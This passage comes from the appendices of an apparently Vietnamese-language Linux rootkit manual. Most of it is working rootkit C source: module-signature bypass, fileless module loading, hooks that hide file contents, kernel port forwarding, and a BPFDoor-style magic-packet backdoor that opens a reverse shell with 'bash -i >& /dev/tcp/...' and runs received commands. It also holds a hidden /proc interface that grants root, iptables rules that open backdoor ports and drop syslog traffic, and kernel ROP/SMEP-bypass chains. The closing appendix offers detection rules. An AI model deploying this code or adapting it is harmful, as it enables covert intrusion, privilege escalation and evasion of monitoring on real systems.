    struct scatterlist sg;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;
    if (in_len < C2_NONCE_SIZE + C2_TAG_SIZE) return -EINVAL;

    /* Extract nonce */
    memcpy(nonce, input, C2_NONCE_SIZE);

    ct_len = in_len - C2_NONCE_SIZE;
    ct_buf = kzalloc(ct_len, GFP_KERNEL);
    if (!ct_buf) return -ENOMEM;

    memcpy(ct_buf, input + C2_NONCE_SIZE, ct_len);

    sg_init_one(&sg, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg, &sg, ct_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_decrypt(req), &wait);

    if (ret == 0) {
        /* Decryption + auth successful */
        *pt_len = ct_len - C2_TAG_SIZE;
        memcpy(plaintext, ct_buf, *pt_len);
    }
    /* ret == -EBADMSG: authentication failed (tampered!) */

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}
```

---

### I.2 Module Signature Bypass {#module-sig-bypass}

```c
/* mod_sig_bypass.c — Bypass CONFIG_MODULE_SIG_FORCE
 *
 * Kernel voi CONFIG_MODULE_SIG_FORCE=y reject unsigned modules.
 * Phai bypass de load rootkit.
 *
 * Methods:
 *   1. Disable sig_enforce tai runtime
 *   2. Load via init_module syscall (bypass modprobe checks)
 *   3. Steal signing key tu kernel build environment
 */

#include "rootkit.h"

/* Method 1: Disable module signature enforcement.
 *
 * sig_enforce = global bool trong kernel.
 * Setting = false -> moi module load ma khong check signature.
 * Can EXISTING kernel code execution (exploit hoac another module).
 *
 * sig_enforce may reside in .rodata (read-only data section).
 * Writing without unprotecting memory -> page fault -> kernel oops.
 * Must call rk_unprotect_memory() to clear WP bit in CR0 first.
 */
static void rk_disable_sig_enforce(void)
{
    bool *enforce;

    enforce = (bool *)rk_lookup_name("sig_enforce");
    if (enforce) {
        rk_unprotect_memory();   /* Must unprotect FIRST */
        *enforce = false;
        rk_protect_memory();     /* Re-protect */
        pr_info("rk: module sig enforcement disabled\n");
    }

    /* Alternative: modify module_sig_check function.
     * Hook no de always return 0 (success). */
}

/* Method 2: Load module programmatically.
 *
 * init_module/finit_module syscall load .ko truc tiep.
 * Bypass modprobe (modprobe them checks).
 *
 * Tu userspace:
 *   int fd = open("rootkit.ko", O_RDONLY);
 *   finit_module(fd, "", 0);
 * Hoac:
 *   void *image = mmap(ko_file);
 *   init_module(image, size, "");
 */
```

---

### I.3 Fileless Rootkit — Load from memory {#fileless-rootkit}

```c
/* fileless.c — Load kernel module tu memory (khong .ko tren disk)
 *
 * Normal: insmod rootkit.ko -> .ko file ton tai tren disk
 *         -> forensics find .ko -> game over.
 *
 * Fileless: module loaded truc tiep tu memory.
 * .ko file KHONG BAO GIO cham disk.
 *
 * Method: init_module() syscall nhan module image tu memory.
 * Loader doc .ko tu network/embedded -> goi init_module().
 */

/* Userspace loader — fileless_loader.c
 * Compile: gcc -o fl fileless_loader.c
 * Run: echo "<base64 .ko>" | ./fl
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/* init_module syscall wrapper */
static int load_module_from_memory(void *image, unsigned long len)
{
    /* init_module(void *module_image, unsigned long len, const char *param_values)
     *
     * module_image: ELF binary of .ko IN MEMORY
     * len: size of module image
     * param_values: module parameters string (empty = "")
     *
     * Kernel se:
     *   1. Parse ELF headers
     *   2. Allocate module memory
     *   3. Copy sections tu image vao allocated memory
     *   4. Resolve symbols, apply relocations
     *   5. Goi module_init function
     *
     * Image KHONG can ton tai tren disk — chi can trong memory. */
    return syscall(__NR_init_module, image, len, "");
}

/* finit_module: load tu fd (co the memfd_create — fd an) */
static int load_module_from_memfd(void *image, unsigned long len)
{
    /* memfd_create: tao anonymous file TRONG MEMORY.
     * Khong visible trong filesystem.
     * Tuy nhien visible trong /proc/PID/fd/ -> an via rootkit. */
    int fd = syscall(__NR_memfd_create, "", 1 /* MFD_CLOEXEC */);
    if (fd < 0) return -1;

    write(fd, image, len);

    /* finit_module: load module tu file descriptor */
    int ret = syscall(__NR_finit_module, fd, "", 0);
    close(fd);
    return ret;
}

/* Full flow:
 *   1. Attacker sends .ko bytes qua encrypted channel
 *   2. Loader receives vao memory buffer
 *   3. Goi load_module_from_memory(buffer, size)
 *   4. Module loaded -> rootkit active
 *   5. Loader overwrites buffer -> free -> exit
 *   6. .ko file NEVER touched disk
 *
 * Combine voi: loader tu xoa (unlink argv[0])
 *              loader qua memfd_create
 *              loader embedded trong exploit payload
 */
```

---

### I.4 File Content Hiding — Reptile-style {#file-content-hide}

```c
/* file_content_hide.c — Hide/modify file contents khi doc
 *
 * Reptile rootkit hook read() de modify file CONTENT.
 * Khac getdents filtering (an filename) — day an NOI DUNG.
 *
 * Use cases:
 *   - /etc/ld.so.preload: an rootkit entry
 *   - /etc/crontab: an persistence entries
 *   - /proc/net/tcp: an connections (already covered)
 *   - Config files: an backdoor configs
 */

#include "rootkit.h"

/* Tich hop vao hooked_read() (Chapter 3).
 * Them check cho tung target file. */
static long filter_file_content(int fd, char __user *user_buf,
                                  long orig_ret,
                                  const char *target_path,
                                  const char *hide_string)
{
    char *kern_buf, *src, *dst;
    long new_ret;

    if (orig_ret <= 0) return orig_ret;
    if (!is_target_file(fd, target_path)) return orig_ret;

    kern_buf = kzalloc(orig_ret + 1, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }
    kern_buf[orig_ret] = '\0';

    /* Remove lines chua hide_string */
    src = kern_buf;
    dst = kern_buf;
    new_ret = 0;

    while (*src) {
        char *eol = strchr(src, '\n');
        int line_len = eol ? (eol - src + 1) : strlen(src);

        if (!strnstr(src, hide_string, line_len)) {
            if (dst != src) memmove(dst, src, line_len);
            dst += line_len;
            new_ret += line_len;
        }
        src += line_len;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* Su dung trong hooked_read:
 *
 * long ret = orig_read(regs);
 * ret = filter_file_content(fd, buf, ret,
 *           "/etc/ld.so.preload", "librk.so");
 * ret = filter_file_content(fd, buf, ret,
 *           "/etc/crontab", "modprobe rk");
 * return ret;
 */
```

---

### I.5 Port Forwarding — Drovorub-style {#port-forwarding}

```c
/* port_forward.c — Kernel-level TCP port forwarding
 *
 * Drovorub provides transparent port forwarding:
 *   Attacker -> rootkit port X -> forward toi internal host:port Y.
 *   Rootkit acts as proxy, completely invisible.
 *
 * Use case: attacker tren external network reach internal services
 * through compromised host.
 */

#include "rootkit.h"
#include <net/sock.h>
#include <linux/kthread.h>

struct forward_rule {
    __be16 listen_port;
    __be32 target_ip;
    __be16 target_port;
};

#define RELAY_BUF_SIZE 4096

/* Relay data giua 2 sockets (bidirectional pipe) */
static int relay_data(struct socket *src, struct socket *dst)
{
    char *buf;
    struct msghdr msg = { 0 };
    struct kvec iov;
    int ret;

    buf = kzalloc(RELAY_BUF_SIZE, GFP_KERNEL);
    if (!buf) return -ENOMEM;

    iov.iov_base = buf;
    iov.iov_len = RELAY_BUF_SIZE;

    ret = kernel_recvmsg(src, &msg, &iov, 1,
                          RELAY_BUF_SIZE, MSG_DONTWAIT);
    if (ret > 0) {
        iov.iov_base = buf;
        iov.iov_len = ret;
        memset(&msg, 0, sizeof(msg));
        kernel_sendmsg(dst, &msg, &iov, 1, ret);
    }

    kfree(buf);
    return ret;
}

static int forward_thread_fn(void *data)
{
    struct forward_rule *rule = data;
    struct socket *listen_sock = NULL, *client_sock = NULL;
    struct socket *target_sock = NULL;
    struct sockaddr_in addr;
    int ret;

    /* Listen socket */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &listen_sock);
    if (ret < 0) goto out;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = rule->listen_port;

    kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
    kernel_listen(listen_sock, 5);

    while (!kthread_should_stop()) {
        /* Accept client */
        ret = kernel_accept(listen_sock, &client_sock, 0);
        if (ret < 0) { msleep(100); continue; }

        /* Connect toi target */
        ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                                IPPROTO_TCP, &target_sock);
        if (ret < 0) { sock_release(client_sock); continue; }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = rule->target_ip;
        addr.sin_port = rule->target_port;

        ret = kernel_connect(target_sock, (struct sockaddr *)&addr,
                              sizeof(addr), 0);
        if (ret < 0) {
            sock_release(target_sock);
            sock_release(client_sock);
            continue;
        }

        /* Bidirectional relay loop */
        while (!kthread_should_stop()) {
            int r1 = relay_data(client_sock, target_sock);
            int r2 = relay_data(target_sock, client_sock);
            if (r1 < 0 && r1 != -EAGAIN) break;
            if (r2 < 0 && r2 != -EAGAIN) break;
            if (r1 == -EAGAIN && r2 == -EAGAIN) msleep(10);
        }

        sock_release(target_sock);
        sock_release(client_sock);
    }

    sock_release(listen_sock);
out:
    kfree(rule);
    return 0;
}
```

---

### I.6 Classic BPF Packet Filter — BPFDoor-style {#classic-bpf}

```c
/* classic_bpf.c — Stealth packet monitoring via classic BPF
 *
 * BPFDoor dung classic BPF (KHONG phai eBPF) vi:
 *   - Chay hoan toan trong userspace
 *   - Attach vao raw socket -> nhan copy of packets
 *   - KHONG can kernel module
 *   - Invisible cho netfilter (netfilter hooks TRUOC BPF socket filters)
 *   - Khong xuat hien trong iptables, nftables, ss
 *
 * Classic BPF filter: compile filter rules thanh bytecode,
 * kernel evaluate bytecode cho moi incoming packet,
 * matching packets delivered toi raw socket.
 *
 * Compile: gcc -o bpf_listener classic_bpf.c
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/filter.h>   /* struct sock_filter, sock_fprog */
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <arpa/inet.h>

#define MAGIC_BYTE_1 0xDE
#define MAGIC_BYTE_2 0xAD

int main(void)
{
    int sock;
    unsigned char buf[65535];
    ssize_t len;

    /* -- BPF filter: ICMP packets with magic bytes in payload --
     *
     * Classic BPF bytecode: array of struct sock_filter instructions.
     * Moi instruction: { code, jt, jf, k }
     *   code = opcode
     *   jt   = jump offset if TRUE
     *   jf   = jump offset if FALSE
     *   k    = constant value
     *
     * Filter logic:
     *   1. Load EtherType field -> check == 0x0800 (IPv4)
     *   2. Load IP protocol field -> check == 1 (ICMP)
     *   3. Load ICMP payload byte -> check == magic
     *   4. If match: accept. Else: reject.
     */
    struct sock_filter bpf_code[] = {
        /* Load EtherType (offset 12 trong Ethernet frame) */
        BPF_STMT(BPF_LD | BPF_H | BPF_ABS, 12),
        /* Check == ETH_P_IP (0x0800). If not: drop (offset 5) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, ETH_P_IP, 0, 5),

        /* Load IP protocol (offset 23: eth=14 + ip.protocol=9) */
        BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 23),
        /* Check == IPPROTO_ICMP (1). If not: drop */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_ICMP, 0, 3),

        /* Load first ICMP payload byte
         * Offset = 14 (eth) + 20 (ip) + 8 (icmp) = 42 */
        BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 42),
        /* Check == MAGIC_BYTE_1 */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, MAGIC_BYTE_1, 0, 1),

        /* Accept: return full packet length */
        BPF_STMT(BPF_RET | BPF_K, 0xFFFF),
        /* Reject: return 0 (drop) */
        BPF_STMT(BPF_RET | BPF_K, 0),
    };

    struct sock_fprog bpf_prog = {
        .len = sizeof(bpf_code) / sizeof(bpf_code[0]),
        .filter = bpf_code,
    };

    /* Create raw socket (ETH_P_ALL = receive all protocols) */
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); return 1; }

    /* Attach BPF filter — kernel only delivers matching packets */
    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER,
                   &bpf_prog, sizeof(bpf_prog)) < 0) {
        perror("setsockopt");
        return 1;
    }

    /* Detach from terminal, disguise process name */
    daemon(0, 0);

    /* -- Packet receive loop -- */
    while (1) {
        len = recv(sock, buf, sizeof(buf), 0);
        if (len <= 0) continue;

        /* Parse: eth + ip + icmp headers -> extract payload */
        struct iphdr *ip = (struct iphdr *)(buf + 14);
        struct icmphdr *icmp = (struct icmphdr *)((char *)ip + ip->ihl * 4);
        char *payload = (char *)(icmp + 1);
        int payload_len = len - 14 - ip->ihl * 4 - sizeof(*icmp);

        if (payload_len > 1 && payload[0] == (char)MAGIC_BYTE_1) {
            /* Magic packet received! Process command. */
            printf("Magic packet from %s\n",
                   inet_ntoa(*(struct in_addr *)&ip->saddr));

            /* Dispatch based on payload[1] command byte */
            switch (payload[1]) {
            case 0x01:  /* Reverse shell */
                system("bash -i >& /dev/tcp/10.10.10.1/4444 0>&1 &");
                break;
            case 0x02:  /* Execute command */
                if (payload_len > 2) {
                    payload[payload_len] = '\0';
                    system(payload + 2);
                }
                break;
            }
        }
    }

    return 0;
}
```

---

### I.7 /proc Fake Entries — Hidden control interface {#proc-fake}

```c
/* proc_interface.c — Tao hidden /proc entry cho rootkit control
 *
 * Thay vi dung magic signal (kill), tao /proc entry
 * cho phep read/write config:
 *   echo "hide 1234" > /proc/.rk_ctl   -> hide PID 1234
 *   echo "unhide 1234" > /proc/.rk_ctl -> show PID 1234
 *   echo "root" > /proc/.rk_ctl        -> give root
 *   cat /proc/.rk_ctl                   -> show status
 *
 * Entry an: bat dau bang "." -> ls /proc khong thay.
 * Ket hop getdents64 hook -> completely invisible.
 */

#include "rootkit.h"

static struct proc_dir_entry *rk_proc_entry;

static ssize_t rk_proc_write(struct file *file,
                               const char __user *buf,
                               size_t count, loff_t *ppos)
{
    char cmd[256];
    pid_t pid;
    int len = min(count, sizeof(cmd) - 1);

    if (copy_from_user(cmd, buf, len))
        return -EFAULT;
    cmd[len] = '\0';

    /* Trim newline */
    if (len > 0 && cmd[len - 1] == '\n')
        cmd[--len] = '\0';

    /* Parse commands */
    if (sscanf(cmd, "hide %d", &pid) == 1) {
        add_hidden_pid(pid);
        pr_info("rk: PID %d hidden\n", pid);
    }
    else if (sscanf(cmd, "unhide %d", &pid) == 1) {
        remove_hidden_pid(pid);
        pr_info("rk: PID %d visible\n", pid);
    }
    else if (strncmp(cmd, "root", 4) == 0) {
        struct cred *new = prepare_creds();
        if (new) {
            new->uid.val = new->euid.val = 0;
            new->gid.val = new->egid.val = 0;
            new->cap_effective = CAP_FULL_SET;
            new->cap_permitted = CAP_FULL_SET;
            commit_creds(new);
        }
    }
    else if (strncmp(cmd, "modhide", 7) == 0) {
        rk_hide_module();
    }
    else if (strncmp(cmd, "modshow", 7) == 0) {
        rk_show_module();
    }
    else if (strncmp(cmd, "destruct", 8) == 0) {
        rk_self_destruct();
    }

    return count;
}

static ssize_t rk_proc_read(struct file *file,
                              char __user *buf,
                              size_t count, loff_t *ppos)
{
    char status[512];
    int len;

    if (*ppos > 0) return 0;

    len = snprintf(status, sizeof(status),
        "=== Rootkit Status ===\n"
        "Module: %s\n"
        "Hidden PIDs: %d\n"
        "Hooks: active\n",
        module_hidden ? "hidden" : "visible",
        rk_get_hidden_pid_count());

    if (len > count) len = count;
    if (copy_to_user(buf, status, len))
        return -EFAULT;

    *ppos = len;
    return len;
}

static const struct proc_ops rk_proc_ops = {
    .proc_read  = rk_proc_read,
    .proc_write = rk_proc_write,
};

int rk_proc_init(void)
{
    /* Ten bat dau "." -> hidden tu ls /proc (nhung van accessible).
     * Ket hop getdents64 hook filter ".rk" prefix -> invisible. */
    rk_proc_entry = proc_create(".rk_ctl", 0600, NULL, &rk_proc_ops);
    return rk_proc_entry ? 0 : -ENOMEM;
}

void rk_proc_cleanup(void)
{
    if (rk_proc_entry)
        proc_remove(rk_proc_entry);
}
```

---

### I.8 iptables Rule Injection tu kernel {#iptables-inject}

```c
/* iptables_inject.c — Inject firewall rules tu kernel space
 *
 * Programmatically add iptables rules de:
 *   - Mo port backdoor
 *   - Forward traffic
 *   - Drop forensics traffic (toi SIEM, log server)
 *   - Redirect DNS (cho DNS hijacking)
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_inject_iptables(void)
{
    char *cmd =
        /* Allow inbound tren backdoor port */
        "iptables -I INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null; "
        /* Allow outbound cho reverse shell */
        "iptables -I OUTPUT -p tcp --dport 4444 -j ACCEPT 2>/dev/null; "
        /* Port forward: external:8080 -> internal:22 (SSH pivot) */
        "iptables -t nat -A PREROUTING -p tcp --dport 8080 "
        "-j DNAT --to-destination 10.0.0.5:22 2>/dev/null; "
        "iptables -t nat -A POSTROUTING -j MASQUERADE 2>/dev/null; "
        "echo 1 > /proc/sys/net/ipv4/ip_forward; "
        /* Drop syslog traffic (prevent log forwarding toi SIEM) */
        "iptables -I OUTPUT -p udp --dport 514 -j DROP 2>/dev/null; "
        /* An rules: iptables-save se thay nhung rootkit co the
         * hook read() tren stdout cua iptables-save process */
        "true";

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static void rk_remove_iptables(void)
{
    char *cmd =
        "iptables -D INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null; "
        "iptables -D OUTPUT -p tcp --dport 4444 -j ACCEPT 2>/dev/null; "
        "iptables -t nat -D PREROUTING -p tcp --dport 8080 "
        "-j DNAT --to-destination 10.0.0.5:22 2>/dev/null; "
        "iptables -D OUTPUT -p udp --dport 514 -j DROP 2>/dev/null; "
        "true";

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

## Appendix J: Exploitation Primitives

### J.1 Kernel ROP / ret2usr / SMEP Bypass {#kernel-rop}

**Deep Kernel Internals: Kernel Exploitation Flow va Hardware Protections**

Khi chua co kernel code execution (chua load duoc module), phai exploit kernel vulnerability truoc. Flow chuan cua kernel privilege escalation exploit:

```
1. Tim vulnerability (buffer overflow, use-after-free, type confusion, etc.)
2. Dat duoc controlled write hoac code execution primitive
3. Build ROP chain tren controlled memory (stack hoac heap):
   a. pop rdi; ret           -> load NULL vao RDI (arg1 cho prepare_kernel_cred)
   b. prepare_kernel_cred(0) -> tra ve root cred pointer trong RAX
   c. mov rdi, rax; ret      -> chuyen cred pointer sang arg1
   d. commit_creds(cred)     -> ap dung root credentials cho current task
   e. swapgs; iretq          -> quay ve userspace voi quyen root
4. Trigger vulnerability de redirect execution toi ROP chain
```

Hardware protections can vuot qua:
- **SMEP** (Supervisor Mode Execution Prevention): CR4 bit 20. Kernel KHONG THE execute code tren userspace pages. Ngan ky thuat ret2usr co dien.
- **SMAP** (Supervisor Mode Access Prevention): CR4 bit 21. Kernel KHONG THE doc/ghi userspace pages. Ngan viec dung user-controlled data lam ROP chain.
- Bypass: ROP gadget `mov cr4, rdi; ret` de clear SMEP/SMAP bits. Tuy nhien kernel 5.x+ implement CR4 pinning — kernel kiem tra va restore CR4 tai moi context switch, lam cho bypass nay kho thanh cong hon.

```c
/* kernel_exploit_primitives.c — Kernel exploitation techniques
 *
 * MISSING coverage: Kernel ROP, ret2usr, SMEP/SMAP bypass.
 * Day la cac techniques dung khi CHUA CO kernel code execution
 * (chua load duoc module) — can exploit vulnerability truoc.
 *
 * Context: rootkit can load module, nhung neu khong co root access,
 * phai exploit kernel vulnerability truoc.
 *
 * NOTE: Day la educational reference, khong phai working exploits.
 * Moi vulnerability khac nhau can gadgets khac nhau.
 */

/* ═══════════════════════════════════════════════════
 * 1. ret2usr (Return to Userspace)
 *
 * Ky thuat cu nhat: redirect kernel execution toi userspace code.
 * Bi chan boi SMEP (Supervisor Mode Execution Prevention, CR4 bit 20)
 * va SMAP (Supervisor Mode Access Prevention, CR4 bit 21).
 *
 * Pre-SMEP flow (kernel < 3.0):
 *   1. Allocate userspace page chua payload
 *   2. Overflow/corrupt function pointer trong kernel
 *   3. Kernel jumps toi userspace payload
 *   4. Payload chay trong ring 0 context
 *
 * SMEP bypass: clear CR4 bit 20 truoc khi ret2usr
 * ═══════════════════════════════════════════════════ */

/* Userspace payload — chay trong ring 0 khi kernel calls no */
void __attribute__((used)) userspace_payload(void)
{
    /* Dang trong kernel context (ring 0) du code o userspace.
     * Goi commit_creds(prepare_kernel_cred(NULL)) cho root.
     *
     * Phai resolve addresses runtime (KASLR).
     * commit_creds_ptr va prepare_kernel_cred_ptr
     * resolved tu /proc/kallsyms hoac info leak. */

    typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *);
    typedef int (*commit_creds_t)(struct cred *);

    prepare_kernel_cred_t pkc =
        (void *)0xffffffff810a9d80;  /* Example — KASLR dependent */
    commit_creds_t cc =
        (void *)0xffffffff810a9b40;  /* Example — KASLR dependent */

    cc(pkc(NULL));
}

/* ═══════════════════════════════════════════════════
 * 2. ROP (Return-Oriented Programming)
 *
 * Kernel ROP: chain gadgets trong kernel text (.text section).
 * Moi gadget = snippet ket thuc bang RET.
 * Chain gadgets tren stack -> arbitrary code execution.
 *
 * Common gadgets (tim bang ROPgadget hoac ropr):
 *   pop rdi; ret     -> load arg1
 *   pop rsi; ret     -> load arg2
 *   mov cr4, rdi; ret -> disable SMEP
 *   xchg eax, esp; ret -> stack pivot
 *
 * Typical ROP chain for privilege escalation:
 *   1. pop rdi; ret -> NULL
 *   2. prepare_kernel_cred -> returns new cred in RAX
 *   3. mov rdi, rax; ret -> move cred to arg1
 *   4. commit_creds -> apply root cred
 *   5. swapgs; iretq -> return to userspace
 * ═══════════════════════════════════════════════════ */

struct rop_chain {
    unsigned long *chain;
    int            length;
    int            capacity;
};

/* Build ROP chain helper — adds gadget address to chain */
static void rop_push(struct rop_chain *rop, unsigned long gadget)
{
    if (rop->length < rop->capacity)
        rop->chain[rop->length++] = gadget;
}

/* Example: build privilege escalation ROP chain.
 * Gadget addresses from specific kernel build — NOT portable.
 * Must be resolved per-target via /proc/kallsyms or info leak.
 */
static void build_privesc_chain(struct rop_chain *rop,
                                  unsigned long kaslr_base)
{
    /* Offsets from kernel base — example values.
     * Find real offsets: ROPgadget --binary vmlinuz | grep "pop rdi" */
    unsigned long pop_rdi_ret     = kaslr_base + 0x001518;
    unsigned long prepare_kcred   = kaslr_base + 0x0a9d80;
    unsigned long mov_rdi_rax_ret = kaslr_base + 0x06238a;
    unsigned long commit_creds_fn = kaslr_base + 0x0a9b40;
    unsigned long swapgs_restore  = kaslr_base + 0xc00eaa;

    /* Chain: prepare_kernel_cred(NULL) */
    rop_push(rop, pop_rdi_ret);
    rop_push(rop, 0);                /* arg1 = NULL */
    rop_push(rop, prepare_kcred);

    /* Chain: commit_creds(result) */
    rop_push(rop, mov_rdi_rax_ret);  /* rdi = rax (cred) */
    rop_push(rop, commit_creds_fn);

    /* Chain: return to userspace cleanly */
    rop_push(rop, swapgs_restore);
    /* IRETQ frame: RIP, CS, RFLAGS, RSP, SS */
    rop_push(rop, (unsigned long)&userspace_return); /* RIP */
    rop_push(rop, 0x33);             /* User CS */
    rop_push(rop, saved_rflags);     /* RFLAGS */
    rop_push(rop, (unsigned long)user_stack); /* RSP */
    rop_push(rop, 0x2b);             /* User SS */
}

/* ═══════════════════════════════════════════════════
 * 3. SMEP/SMAP Bypass
 *
 * SMEP: CR4 bit 20 — prevents ring 0 executing user pages
 * SMAP: CR4 bit 21 — prevents ring 0 accessing user pages
 *
 * Bypass ROP gadget: mov cr4, rdi; ret
 * Set rdi = CR4 value with bits 20+21 cleared.
 *
 * Modern bypass (post-5.x): CR4 pinning makes this harder.
 * Kernel checks CR4 on context switch -> re-enables SMEP/SMAP.
 * Must complete exploit before next context switch.
 * ═══════════════════════════════════════════════════ */

/* ROP gadget to disable SMEP/SMAP */
static void add_smep_bypass(struct rop_chain *rop,
                              unsigned long kaslr_base)
{
    unsigned long pop_rdi_ret    = kaslr_base + 0x001518;
    unsigned long mov_cr4_rdi   = kaslr_base + 0x06a4b0;

    /* Current CR4 with SMEP(20) and SMAP(21) cleared */
    unsigned long cr4_no_smep_smap = 0x6f0;  /* Example value */

    rop_push(rop, pop_rdi_ret);
    rop_push(rop, cr4_no_smep_smap);
    rop_push(rop, mov_cr4_rdi);
}

/* ═══════════════════════════════════════════════════
 * 4. Stack Pivot
 *
 * Khi overflow chi control limited bytes tren stack,
 * can "pivot" RSP toi attacker-controlled buffer
 * chua full ROP chain.
 *
 * Common gadget: xchg eax, esp; ret
 *   Swap lower 32 bits of RAX with ESP.
 *   RAX set via earlier gadget toi mmap'd address.
 * ═══════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════
 * 5. KASLR Bypass
 *
 * KASLR randomizes kernel text base address moi boot.
 * Phai leak base address truoc khi build ROP chain.
 *
 * Leak vectors:
 *   a) /proc/kallsyms (neu kptr_restrict=0)
 *   b) dmesg (kernel pointers, neu dmesg_restrict=0)
 *   c) Side-channel (prefetch, TSX, spectre variants)
 *   d) Info leak vulnerability (uninitialized stack/heap data)
 *   e) /sys/kernel/notes (ELF notes chua build-id -> offset calc)
 * ═══════════════════════════════════════════════════ */

static unsigned long leak_kaslr_base(void)
{
    FILE *f;
    char line[256];
    unsigned long addr;

    /* Method A: /proc/kallsyms (easiest, requires root or kptr_restrict=0) */
    f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;

    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " T _text") || strstr(line, " T startup_64")) {
            sscanf(line, "%lx", &addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    return 0;
}
```

---

## Appendix K: Detection Engineering Additions {#detection-additions}

```bash
# ═══════════════════════════════════════════════════════════════
# BO SUNG Detection Engineering — Chapter 16
# Cover moi technique chua co detection rule
# ═══════════════════════════════════════════════════════════════

# -- 1. VFS iterate_shared hook detection --
# Check neu /proc file_operations bi modified
# So sanh f_op pointer voi expected kernel address
cat /proc/kallsyms | grep "proc_root_operations"
# Neu runtime f_op khac static value -> hooked

# -- 2. Inline hook detection --
# Scan kernel text cho mov rax + jmp rax pattern tai function entry
# Pattern: 48 b8 XX XX XX XX XX XX XX XX ff e0
python3 -c "
import mmap, re
with open('/proc/kcore', 'rb') as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    # Tim trampoline pattern
    pattern = b'\\x48\\xb8.{8}\\xff\\xe0'
    for m in re.finditer(pattern, mm):
        print(f'Inline hook at offset {hex(m.start())}')
" 2>/dev/null

# -- 3. IDT modification detection --
# Compare IDT entries voi expected values
python3 -c "
# Read IDTR va compare entries
# Volatility: vol3 -f dump.raw linux.check_idt
print('Use: vol3 linux.check_idt.CheckIDT')
"

# -- 4. MSR_LSTAR detection --
# Check MSR_LSTAR points vao kernel text
rdmsr 0xC0000082 2>/dev/null || echo "Install msr-tools"
# Compare output voi: grep entry_SYSCALL_64 /proc/kallsyms

# -- 5. LSM hook detection --
# List registered LSM modules
cat /sys/kernel/security/lsm
# Check cho unexpected entries
# Compare security_hook_heads list count truoc va sau

# -- 6. Port knock detection (Suricata rule) --
cat > /etc/suricata/rules/rootkit.rules << 'SURICATA'
# Detect port knocking pattern: 3 SYN packets to unusual ports < 5s
alert tcp any any -> $HOME_NET any (msg:"Possible port knock sequence"; \
    flags:S; threshold:type threshold, track by_src, count 3, seconds 5; \
    sid:1000001; rev:1;)

# Detect ICMP tunnel (large/frequent ICMP payloads)
alert icmp any any -> $HOME_NET any (msg:"ICMP tunnel suspected"; \
    dsize:>100; threshold:type threshold, track by_src, count 10, seconds 60; \
    sid:1000002; rev:1;)

# Detect DNS tunnel (high-entropy subdomain queries)
alert dns any any -> any 53 (msg:"DNS tunnel suspected"; \
    dns.query; content:"."; offset:30; \
    sid:1000003; rev:1;)
SURICATA

# -- 7. Auditd rules cho rootkit detection --
cat > /etc/audit/rules.d/rootkit.rules << 'AUDIT'
# Monitor module loading
-w /sbin/insmod -p x -k rootkit_module_load
-w /sbin/modprobe -p x -k rootkit_module_load
-a always,exit -F arch=b64 -S init_module -S finit_module -k module_load

# Monitor credential changes
-a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -k cred_change

# Monitor /etc/ld.so.preload (LD_PRELOAD rootkit)
-w /etc/ld.so.preload -p wa -k ld_preload

# Monitor /proc/sys writes (sysctl manipulation)
-w /proc/sys/ -p w -k sysctl_modify

# Monitor raw socket creation
-a always,exit -F arch=b64 -S socket -F a0=2 -F a1=3 -k raw_socket

# Monitor keylogger targets
-w /dev/input/ -p r -k input_device_access
AUDIT

# -- 8. Keylogger detection --
# Check registered keyboard notifiers
cat /sys/kernel/debug/notifier/keyboard 2>/dev/null
# Check input handlers
ls -la /dev/input/
cat /proc/bus/input/handlers
# Unexpected handler = potential keylogger

# -- 9. Timestamp manipulation detection --
# Find files with timestamps matching /bin/ls (timestomped indicator)
